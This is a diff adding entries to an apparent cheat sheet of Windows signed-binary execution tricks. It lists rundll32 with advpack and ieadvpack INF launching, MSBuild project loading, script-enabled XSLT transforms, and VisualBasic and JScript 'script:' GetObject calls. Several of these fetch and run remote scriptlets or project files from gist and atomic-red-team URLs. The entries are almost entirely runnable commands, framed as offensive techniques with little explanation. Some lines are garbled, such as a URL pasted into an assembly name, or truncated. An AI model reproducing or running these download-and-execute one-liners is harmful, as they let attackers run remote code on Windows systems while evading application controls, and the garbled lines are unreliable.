@@ -74,8 +74,8 @@ https://gist.githubusercontent.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec/raw
 
 ```
 
-Product @bohops
----------------
+(Note) Product Via @bohops 
+
 ( 11 ) HTA Launch Execution ( url.dll ) 
 ```
 Rundll32.exe url.dll,OpenURL FileHTA Or Anything 
@@ -84,3 +84,39 @@ Rundll32.exe url.dll,OpenURL FileHTA Or Anything
 ```
 rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1, 
 ```
+
+( 13 ) XML Launch Execution Via Reflection,Assembly Powershell 
+
+```
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');
+$proj = [System.Xml.XmlReader]::create("https://gist.githubusercontent.com/caseysmithrc/8e58d11bc99e496a19424fbe5a99175f/raw/38256d70b414f6678005366efc86009c562948c6/xslt2.proj")
+$e=new-object Microsoft.Build.Evaluation.Project($proj); 
+$e.build();
+```
+( 14 ) CSharp Launch Execution Via Reflection.Assembly Powershell 
+
+```
+[Reflection.Assembly]::LoadWithPartialName('http://Microsoft.Build '); $e=new-object http://Microsoft.Build.Evaluation.Project('evil.csproj'); $e.Build();
+```
+( 15 ) SCT Execution Via INFScript By ( advpack.dll )
+
+```
+rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
+```
+( 16 ) XML Launch Execution Via Reader XML,Transform Object Powershell 
+```
+$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r);$x.Transform('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xml','z');del z;
+```
+
+( 17 ) SCT Launch Execution Reflection.Assembly Via ( Microsoft.VisualBasic )
+
+```
+ [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct …').Exec(0)
+
+```
+
+( 18 )SCT Launch Execution Reflection.Assembly Via ( Microsoft.JScript )
+```
+[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct …").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+```
+
